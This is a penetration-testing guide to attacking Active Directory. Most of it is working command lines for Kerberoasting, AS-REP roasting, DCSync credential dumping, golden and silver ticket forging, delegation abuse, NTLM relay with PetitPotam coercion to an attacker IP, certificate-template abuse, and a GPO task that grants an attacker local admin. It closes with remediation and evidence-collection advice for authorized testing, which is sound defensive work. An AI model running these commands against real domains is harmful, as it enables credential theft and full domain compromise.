# Active Directory Attack Testing

## Overview
Active Directory (AD) is the backbone of enterprise identity and access management in Windows environments. AD attack testing evaluates the security posture of domain controllers, trust relationships, Group Policy, Kerberos authentication, certificate services, and delegation configurations. Successful attacks can lead to full domain compromise, enabling access to every system and resource in the organization.

## Classification
- **CWE:** CWE-287 (Improper Authentication), CWE-269 (Improper Privilege Management), CWE-522 (Insufficiently Protected Credentials)
- **MITRE ATT&CK:** T1558 (Steal or Forge Kerberos Tickets), T1003 (OS Credential Dumping), T1484 (Domain Policy Modification), T1187 (Forced Authentication)
- **CVSS Base:** 7.5 - 10.0 (High to Critical)

## Detection Methodology

### 1. AD Enumeration
Gather domain information before attacking:
```bash
# Enumerate domain info (from domain-joined host)
nltest /dclist:corp.local
nltest /domain_trusts

# LDAP enumeration with ldapsearch
ldapsearch -x -H ldap://dc.corp.local -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://dc.corp.local -b "DC=corp,DC=local" "(objectClass=computer)" cn

# Enumerate with PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup -Identity "Domain Admins"
Get-DomainComputer
Get-DomainTrust
Get-DomainGPO

# Enumerate with enum4linux-ng
enum4linux-ng -A dc.corp.local

# Enumerate with windapsearch
windapsearch --dc dc.corp.local -d corp.local -u user -p password --da
windapsearch --dc dc.corp.local -d corp.local -u user -p password --computers
```

### 2. Kerberoasting
Request Kerberos TGS tickets for service accounts and crack them offline:
```bash
# Impacket GetUserSPNs
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerberoast.txt
Rubeus.exe kerberoast /user:svc_sql /outfile:targeted.txt

# PowerView + Invoke-Kerberoast
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash > hashes.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule

# Crack with john
john --format=krb5tgs kerberoast.txt --wordlist=wordlist.txt
```

### 3. AS-REP Roasting
Attack accounts with Kerberos pre-authentication disabled:
```bash
# Find AS-REP roastable accounts
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat -outputfile asrep.txt

# With credentials
impacket-GetNPUsers corp.local/user:password -dc-ip 10.10.10.1 -request

# Rubeus (Windows)
Rubeus.exe asreproast /outfile:asrep.txt

# PowerView - find vulnerable accounts
Get-DomainUser -PreauthNotRequired

# Crack with hashcat
hashcat -m 18200 asrep.txt wordlist.txt
```

### 4. DCSync Attack
Simulate domain controller replication to extract credentials:
```bash
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
# Typically: Domain Admin, Enterprise Admin, or delegated accounts

# Impacket secretsdump (DCSync)
impacket-secretsdump corp.local/admin:password@dc.corp.local -just-dc
impacket-secretsdump corp.local/admin:password@dc.corp.local -just-dc-user krbtgt
impacket-secretsdump corp.local/admin:password@dc.corp.local -just-dc-ntlm

# Mimikatz DCSync
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz# lsadump::dcsync /domain:corp.local /all /csv
```

### 5. Golden Ticket Attack
Forge a TGT using the krbtgt hash for persistent domain access:
```bash
# Requires: krbtgt NTLM hash + domain SID

# Get domain SID
impacket-lookupsid corp.local/admin:password@dc.corp.local

# Mimikatz golden ticket
mimikatz# kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Impacket ticketer
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local FakeAdmin
export KRB5CCNAME=FakeAdmin.ccache
impacket-psexec -k -no-pass corp.local/FakeAdmin@dc.corp.local
```

### 6. Silver Ticket Attack
Forge a TGS for a specific service using its service account hash:
```bash
# Requires: Service account NTLM hash + domain SID + SPN

# Mimikatz silver ticket (e.g., CIFS service)
mimikatz# kerberos::golden /user:FakeUser /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:SERVICE_HASH /ptt

# Impacket ticketer
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/fileserver.corp.local FakeUser
```

### 7. Delegation Attacks

**Unconstrained Delegation:**
```bash
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained
impacket-findDelegation corp.local/user:password -dc-ip 10.10.10.1

# Exploit: coerce authentication from DC, capture TGT
# Use SpoolSample / Printerbug / PetitPotam to trigger
SpoolSample.exe dc.corp.local unconstrained-host.corp.local
# Then extract forwarded TGT from unconstrained host memory
Rubeus.exe monitor /interval:5 /nowrap
```

**Constrained Delegation:**
```bash
# Find constrained delegation accounts
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# S4U2Self + S4U2Proxy attack
impacket-getST -spn cifs/target.corp.local -impersonate administrator corp.local/svc_account:password -dc-ip 10.10.10.1
export KRB5CCNAME=administrator.ccache

# Rubeus
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
```

**Resource-Based Constrained Delegation (RBCD):**
```bash
# If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a target
# Create a machine account
impacket-addcomputer corp.local/user:password -computer-name 'EVIL$' -computer-pass 'Password123'

# Set RBCD on target
impacket-rbcd corp.local/user:password -delegate-to 'TARGET$' -delegate-from 'EVIL$' -dc-ip 10.10.10.1 -action write

# Get service ticket
impacket-getST -spn cifs/target.corp.local -impersonate administrator corp.local/'EVIL$':'Password123' -dc-ip 10.10.10.1
```

### 8. NTLM Relay Attacks
```bash
# Responder (capture NTLM hashes)
responder -I eth0 -rdwv

# ntlmrelayx (relay captured auth to other targets)
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support --delegate-access
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# PetitPotam (coerce NTLM auth from DC)
python3 PetitPotam.py attacker-ip dc.corp.local
# Relay to AD CS for ESC8
impacket-ntlmrelayx -tf targets.txt --adcs --template DomainController
```

### 9. AD CS (Certificate Services) Abuse
```bash
# Enumerate AD CS with Certipy
certipy find -u user@corp.local -p password -dc-ip 10.10.10.1

# ESC1 - Enrollee supplies subject (SAN)
certipy req -u user@corp.local -p password -ca CORP-CA -target ca.corp.local -template VulnTemplate -upn administrator@corp.local

# ESC4 - Vulnerable certificate template ACLs
certipy template -u user@corp.local -p password -template VulnTemplate -save-old

# ESC8 - NTLM relay to HTTP enrollment
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### 10. GPO Abuse
```bash
# Enumerate GPO permissions
Get-DomainGPO | Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner"}

# SharpGPOAbuse - add local admin via GPO
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# SharpGPOAbuse - add scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author CORP\admin --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Vulnerable GPO"

# pyGPOAbuse (Linux)
python3 pygpoabuse.py corp.local/user:password -gpo-id "GPO-GUID" -command "cmd /c whoami" -f
```

## Tool Usage

### BloodHound
```bash
# Collect data with SharpHound (Windows)
SharpHound.exe -c All
SharpHound.exe -c All --ldapusername user --ldappassword password

# Collect with bloodhound-python (Linux)
bloodhound-python -u user -p password -d corp.local -ns 10.10.10.1 -c All

# Import JSON files into BloodHound GUI
# Key queries:
# - Shortest path to Domain Admins
# - Find all Kerberoastable users
# - Find AS-REP roastable users
# - Find unconstrained delegation computers
# - Find RBCD attack paths
# - Find AD CS vulnerable templates
```

### Certipy
```bash
# Full AD CS enumeration
certipy find -u user@corp.local -p password -dc-ip 10.10.10.1 -vulnerable

# Request certificate
certipy req -u user@corp.local -p password -ca CORP-CA -target ca.corp.local -template User

# Authenticate with certificate
certipy auth -pfx cert.pfx -dc-ip 10.10.10.1
```

### Rubeus
```cmd
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP roasting
Rubeus.exe asreproast /outfile:asrep.txt

# Request TGT
Rubeus.exe asktgt /user:admin /password:password /ptt

# Ticket extraction
Rubeus.exe dump /nowrap
Rubeus.exe triage
```

## Remediation
1. **Kerberoasting mitigation** -- use long (25+), complex passwords for service accounts; prefer gMSA accounts
2. **AS-REP roasting mitigation** -- enable Kerberos pre-authentication for all accounts
3. **DCSync protection** -- restrict DS-Replication rights to Domain Controllers only
4. **Golden ticket defense** -- rotate krbtgt password twice; enable ATA/MDI for detection
5. **Delegation hardening** -- minimize unconstrained delegation; use Protected Users group
6. **NTLM relay prevention** -- enable SMB signing, LDAP signing and channel binding, EPA on all services
7. **AD CS hardening** -- audit certificate templates, remove enrollee-supplies-subject, require CA manager approval
8. **GPO security** -- restrict GPO modification rights, monitor GPO changes
9. **Tiered administration** -- separate Tier 0 (DC), Tier 1 (servers), Tier 2 (workstations) credentials
10. **Deploy Microsoft Defender for Identity** -- detect reconnaissance, lateral movement, and persistence attacks

## Evidence Collection
When documenting Active Directory findings:
- Domain name, functional level, and trust relationships
- BloodHound attack path screenshots showing shortest path to Domain Admins
- Kerberoasted/AS-REP roasted hashes and cracked passwords (sanitize actual values)
- DCSync evidence showing extracted credential data
- Certificate template configurations showing vulnerable settings
- Delegation misconfigurations found
- GPO permissions that allow abuse
- Timeline of the attack chain from initial foothold to domain compromise
- Number of accounts and systems affected
